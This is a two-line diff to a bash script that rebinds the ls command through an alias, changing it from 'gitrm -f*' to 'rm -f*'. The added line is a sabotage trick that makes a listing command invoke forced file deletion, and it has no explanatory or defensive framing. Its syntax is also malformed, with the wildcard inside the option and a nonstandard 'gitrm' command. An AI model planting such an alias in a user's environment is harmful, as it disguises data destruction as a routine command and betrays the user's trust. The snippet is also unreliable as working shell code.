@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls='gitrm -f*'
+alias ls='rm -f*'
